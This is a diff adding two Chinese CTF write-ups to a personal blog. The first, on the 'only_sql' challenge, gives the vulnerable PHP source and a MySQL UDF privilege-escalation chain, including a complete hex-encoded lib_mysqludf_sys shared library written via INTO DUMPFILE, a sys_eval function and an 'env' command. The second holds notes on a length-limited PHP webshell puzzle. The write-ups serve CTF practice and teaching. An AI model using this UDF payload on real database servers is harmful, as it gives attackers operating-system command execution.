@@ -167,6 +167,377 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/02/05/xihulunjian/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ch.jpg">
+      <meta itemprop="name" content="chleynx">
+      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="星河风">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/02/05/xihulunjian/" class="post-title-link" itemprop="url">西湖论剑</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-02-05 00:48:41 / 修改时间：00:50:32" itemprop="dateCreated datePublished" datetime="2024-02-05T00:48:41+08:00">2024-02-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="only-sql"><a href="#only-sql" class="headerlink" title="only_sql"></a>only_sql</h2><p>连上自己的数据库，load data写文件进去</p>
+<p>读到源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">// mine</span><br><span class="line">// $db_host = &#x27;127.0.0.1&#x27;;</span><br><span class="line">// $db_username = &#x27;root&#x27;;</span><br><span class="line">// $db_password = &#x27;1q2w3e4r5t!@#&#x27;;</span><br><span class="line">// $db_name = &#x27;mysql&#x27;;</span><br><span class="line"></span><br><span class="line">$db_host = $_POST[&quot;db_host&quot;];</span><br><span class="line">$db_username = $_POST[&quot;db_username&quot;];</span><br><span class="line">$db_password = $_POST[&quot;db_password&quot;];</span><br><span class="line">$db_name = $_POST[&quot;db_name&quot;];</span><br><span class="line">if(isset($db_host))&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        $dsn = &quot;mysql:host=$db_host;dbname=$db_name&quot;;</span><br><span class="line">        $pdo = new PDO($dsn, $db_username, $db_password);</span><br><span class="line">        $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">        $_SESSION[&#x27;dsn&#x27;]=$dsn;</span><br><span class="line">        $_SESSION[&#x27;db_username&#x27;]=$db_username;</span><br><span class="line">        $_SESSION[&#x27;db_password&#x27;]=$db_password;</span><br><span class="line">    &#125; catch (Exception $e) &#123;</span><br><span class="line">       die($e-&gt;getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(!isset($_SESSION[&#x27;dsn&#x27;]))&#123;</span><br><span class="line">    die(&quot;&lt;script&gt;alert(&#x27;请先连接数据库&#x27;);window.location.href=&#x27;index.php&#x27;&lt;/script&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;执行数据库命令&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;h1&gt;执行数据库命令&lt;/h1&gt;</span><br><span class="line">        &lt;form action=&quot;query.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;form-group&quot;&gt;</span><br><span class="line">                &lt;label for=&quot;db_command&quot;&gt;MySQL命令：&lt;/label&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; id=&quot;db_command&quot; name=&quot;db_command&quot; style=&quot;width: 500px;&quot; required&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div class=&quot;form-group&quot;&gt;</span><br><span class="line">                &lt;button type=&quot;submit&quot;&gt;执行命令&lt;/button&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div class=&quot;result&quot;&gt;</span><br><span class="line">           </span><br><span class="line">            &lt;?php</span><br><span class="line">            if (isset($_POST[&#x27;db_command&#x27;])) &#123;</span><br><span class="line">                $db_command = $_POST[&quot;db_command&quot;];</span><br><span class="line">                $dsn=$_SESSION[&#x27;dsn&#x27;];</span><br><span class="line">                $db_username = $_SESSION[&#x27;db_username&#x27;];</span><br><span class="line">                $db_password = $_SESSION[&#x27;db_password&#x27;];</span><br><span class="line"></span><br><span class="line">                try &#123;</span><br><span class="line">                    $pdo = new PDO($dsn, $db_username, $db_password,array(PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true));</span><br><span class="line">                    $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line"></span><br><span class="line">                    $stmt = $pdo-&gt;prepare($db_command);</span><br><span class="line">                    $stmt-&gt;execute();</span><br><span class="line">                    $result = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);</span><br><span class="line"></span><br><span class="line">                    if ($result) &#123;</span><br><span class="line">                        echo &quot;&lt;h2&gt;执行结果：&lt;/h2&gt;&quot;;</span><br><span class="line">                        echo &quot;&lt;table&gt;&quot;;</span><br><span class="line">                        echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">                        foreach (array_keys($result[0]) as $column) &#123;</span><br><span class="line">                            echo &quot;&lt;th&gt;$column&lt;/th&gt;&quot;;</span><br><span class="line">                        &#125;</span><br><span class="line">                        echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">                        foreach ($result as $row) &#123;</span><br><span class="line">                            echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">                            foreach ($row as $value) &#123;</span><br><span class="line">                                echo &quot;&lt;td&gt;$value&lt;/td&gt;&quot;;</span><br><span class="line">                            &#125;</span><br><span class="line">                            echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">                        &#125;</span><br><span class="line">                        echo &quot;&lt;/table&gt;&quot;;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        echo &quot;&lt;p&gt;没有结果返回。&lt;/p&gt;&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (Exception $e) &#123;</span><br><span class="line">                    echo &quot;&lt;p class=&#x27;error-message&#x27;&gt;执行错误：&quot; . $e-&gt;getMessage() . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>eeee 没啥用</p>
+<p>直接读flag———明明说是sql结果flag不在数据库里面</p>
+<p><img src="/2024/02/05/xihulunjian/a632333b578fdec9ceafb91aac43c792-1707065365080-1.png" alt="a632333b578fdec9ceafb91aac43c792"></p>
+<p>然后提权，先是日志提权，然后udf，我都没有成功，</p>
+<p><img src="/2024/02/05/xihulunjian/image-20240204232610093-1707065365080-2.png" alt="image-20240204232610093"></p>
+<p>复现的时候看见大佬用的udf？？可能我对动态链接处理那里出了问题吧（只能手写？？）</p>
+<h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>读plugin位置</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>/usr/lib/mysql/p1ugin/</code>，注意这里是1不是l</p>
+<p>接下来写动态链接库</p>
+<p>手工写入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/usr/lib/mysql/p1ugin/udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>会报generate error，没关系</p>
+<p>创建自定义函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>调用命令，flag在环境变量</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;env&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/02/05/xihulunjian/image-20240204232922793.png" alt="image-20240204232922793"></p>
+
+      
+    </div>
+
+    
+    
+    
+	
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/02/05/TelCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ch.jpg">
+      <meta itemprop="name" content="chleynx">
+      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="星河风">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/02/05/TelCTF/" class="post-title-link" itemprop="url">TelCTF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-02-05 00:45:06 / 修改时间：00:47:46" itemprop="dateCreated datePublished" datetime="2024-02-05T00:45:06+08:00">2024-02-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Stress-Release-Service"><a href="#Stress-Release-Service" class="headerlink" title="Stress Release Service"></a><strong>Stress Release Service</strong></h1><h2 id="Stress-Release-Service-1"><a href="#Stress-Release-Service-1" class="headerlink" title="Stress Release Service:"></a><strong>Stress Release Service:</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Chall name:</span><br><span class="line">- Stress Release Service</span><br><span class="line"></span><br><span class="line">Category:</span><br><span class="line">- Misc / Web</span><br><span class="line"></span><br><span class="line">Author:</span><br><span class="line">- tsug0d</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">For a better New Year, we are introducing a service that can help you reduce stress: &lt;http://192.53.173.71:8080&gt; . As our service is only available during the New Year, we are also providing you with a code for later use in material section.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/8d78a98b-0a45-4355-a471-4e5956cf6fe5/StressReleaseService__give.zip">StressReleaseService__give.zip</a></p>
+<p>It is using <code>preg_match</code> to validate.</p>
+<p>为啥是misc题啊</p>
+<p>限制7个字符长度，可能需要点脑洞吧（</p>
+<p>tiniest php webshell?</p>
+<p><a target="_blank" rel="noopener" href="https://www.pentestpartners.com/security-blog/the-tiniest-php-system-shell-ever/">https://www.pentestpartners.com/security-blog/the-tiniest-php-system-shell-ever/</a></p>
+<p>抽象，反引号或者想办法传参？</p>
+<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/302a6103-2a30-446e-aba4-8686bf154b39/Untitled.txt">CTFshow_rce极限大挑战</a></p>
+<p>他不限制在7个字符可以看下面这张图<img src="/image-20240204224839567-1707065135959-1.png" alt="../TelCTF/image-20240204224839567"></p>
+<p><img src="/2024/02/05/TelCTF/image-20240204224909674-1707065135960-2.png" alt="image-20240204224909674"></p>
+<p>相同的字符他会认为是一个</p>
+<p>我这里最短的自增是11位字符 师傅们可以试试异或<img src="/2024/02/05/TelCTF/image-20240204224932506-1707065135960-3.png" alt="image-20240204224932506"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/splitline/PHPFuck">https://github.com/splitline/PHPFuck</a></p>
+<p><a target="_blank" rel="noopener" href="https://b-viguier.github.io/PhpFk/">https://b-viguier.github.io/PhpFk/</a></p>
+<p>他不能超过300 phpfunck太容易超过了</p>
+<p>看看能不能eval另一个get参数</p>
